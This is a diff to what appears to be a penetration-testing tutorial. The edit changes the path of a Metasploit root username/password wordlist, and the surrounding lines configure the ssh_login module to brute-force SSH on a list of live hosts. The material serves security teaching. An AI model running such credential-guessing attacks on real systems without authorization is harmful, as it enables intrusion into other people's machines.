@@ -17,7 +17,7 @@ We will use a brute force password attack against the targets we found in the pr
 Viewing our list of passwords that comes with metasploit:
 
 ```bash
-$ head data/wordlists/root_userpass.txt
+$ head /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
 root
 root !root
@@ -106,8 +106,8 @@ We'll load the file that we created in the previous step with our targets as our
 msf auxiliary(ssh_login) > set RHOSTS file:live_hosts.txt
 rhosts => file:live_hosts.txt
 
-msf auxiliary(ssh_login) > set USERPASS_FILE data/wordlists/root_userpass.txt
-USERPASS_FILE => data/wordlists/root_userpass.txt
+msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
 msf auxiliary(ssh_login) > set VERBOSE false
 VERBOSE => false
